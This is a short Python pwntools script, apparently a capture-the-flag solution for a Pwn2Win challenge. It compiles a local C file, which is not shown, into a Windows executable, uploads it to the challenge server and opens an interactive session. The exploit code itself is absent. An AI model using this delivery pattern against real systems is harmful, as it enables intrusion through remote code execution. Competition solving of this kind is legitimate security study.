#!/usr/bin/env python3
from pwn import *


def connect():
    return remote("enlightenme.pwn2win.party", 1337)


def main():
    subprocess.check_call(
        [
            "x86_64-w64-mingw32-gcc",
            "-o",
            "pwnit.exe",
            "-s",
            "-Os",
            "-Wall",
            "-Wextra",
            "-Werror",
            "pwnit.c",
            "-lntdll",
            "-lws2_32",
        ]
    )
    with open("pwnit.exe", "rb") as pe_fp:
        pe = pe_fp.read()
    with connect() as tube:
        tube.sendlineafter("What's the size of your x64 PE file:\n", str(len(pe)))
        tube.sendafter("Send us your file and let us compute for you:\n", pe)
        tube.interactive()


if __name__ == "__main__":
    main()
